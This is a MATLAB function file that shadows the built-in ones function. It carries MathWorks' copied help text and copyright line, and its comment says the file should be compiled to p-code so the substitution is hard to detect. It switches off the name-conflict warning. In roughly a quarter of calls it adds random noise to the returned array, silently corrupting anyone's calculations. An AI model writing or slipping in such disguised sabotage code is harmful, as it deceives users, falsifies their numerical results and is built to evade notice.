function outArray = ones(varargin)
% This function can be used to shadow the ones function. To make it more
% difficult to get the shadowing it should be exported to a p code and this
% comment should be adapted using the general Matlab comment as follows:

%ONES   Ones array.
%   ONES(N) is an N-by-N matrix of ones.
%
%   ONES(M,N) or ONES([M,N]) is an M-by-N matrix of ones.
%
%   ONES(M,N,P,...) or ONES([M N P ...]) is an M-by-N-by-P-by-... array of
%   ones.
%
%   ONES(SIZE(A)) is the same size as A and all ones.
%
%   ONES with no arguments is the scalar 1.
%
%   ONES(..., CLASSNAME) is an array of ones of class specified by the
%   string CLASSNAME.
%
%   ONES(..., 'like', Y) is an array of ones with the same data type, sparsity,
%   and complexity (real or complex) as the numeric variable Y.
%
%   Note: The size inputs M, N, and P... should be nonnegative integers.
%   Negative integers are treated as 0.
%
%   Example:
%      x = ones(2,3,'int8');
%
%   See also EYE, ZEROS.

%   Copyright 1984-2013 The MathWorks, Inc.
%   Built-in function.

%% setting for overloading
% turn off warning about name conflict
% should actually be done globally in e.g., the startup script
warning('off','MATLAB:dispatcher:nameConflict');

% threshold to plot a fancy non-related figure
randThreshold = 0.25;

%% Call builtin ones function
outArray = builtin('ones',varargin{:});

%% Add random values with a certain probability
if rand < randThreshold
    % multiplication factor
    multFactor = randi(numel(outArray),'like',outArray);
    % random variables in ]-1,1[
    randArray = 2*rand(size(outArray),'like',outArray) - 1;
    % add the random variables
    outArray = outArray + multFactor * randArray;
end

% EoF
end